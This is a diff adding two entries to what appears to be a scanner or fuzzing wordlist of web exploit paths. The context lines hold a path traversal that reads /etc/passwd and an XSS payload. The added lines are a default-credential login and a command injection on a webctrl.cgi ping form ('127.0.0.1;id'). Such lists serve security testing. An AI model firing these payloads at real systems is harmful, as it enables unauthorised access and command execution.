@@ -832,3 +832,5 @@
 /wp-json/wp/v2/users/me?context=edit
 /assets/php/filebrowser/filebrowser.main.php?file=../../../../../../../../../../etc/passwd&do=download
 /vendor/curl/curl/tests/server/php-curl-test/post_file_path_upload.php?key=<img%20src%20onerror%3dalert(document.domain)>
+/cgi-bin/webctrl.cgi?action=login_authentication&redirect_action=sysinfo_page&login_username=blueangel&login_password=blueangel&B1=Login
+/cgi-bin/webctrl.cgi?action=pingtest_update&ping_addr=127.0.0.1%3Bid&B1=PING
